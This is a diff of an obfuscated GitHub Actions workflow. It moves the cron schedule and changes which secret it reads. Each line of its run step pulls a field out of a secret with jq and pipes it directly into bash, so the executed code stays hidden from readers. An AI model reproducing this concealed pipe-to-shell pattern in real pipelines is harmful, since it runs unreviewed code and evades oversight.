@@ -3,20 +3,25 @@ name: caohong19870101
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
+    - cron: '9 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caohong19870101
         env:
-          r19300: ${{ secrets.r19300 }}
+          bxnnp23: ${{ secrets.bxnnp23 }}
         run: |
-          echo $r19300 | jq -r .cigu9 | /bin/bash
-          echo $ywa71019 | jq -r .jk3807 | /bin/bash
-          echo $nn5 | jq -r .vp5 | /bin/bash
-          echo $ds5337 | jq -r .k33567 | /bin/bash
-          echo $nkgu091 | jq -r .qr892 | /bin/bash
+          echo $bxnnp23 | jq -r .h465 | /bin/bash
+          echo $udi62 | jq -r .a26 | /bin/bash
+          echo $wgrrp5111 | jq -r .rdzy0 | /bin/bash
+          echo $jbfdj13892 | jq -r .glyo72965 | /bin/bash
+          echo $seh39992 | jq -r .fa48783 | /bin/bash
+          echo $ioka6829 | jq -r .lk5389 | /bin/bash
+          echo $ebjea4 | jq -r .zq976 | /bin/bash
+          echo $rr721 | jq -r .kos554 | /bin/bash
+          echo $gamf54 | jq -r .vxstm1 | /bin/bash
+          echo $rqpz8237 | jq -r .jh09 | /bin/bash
 
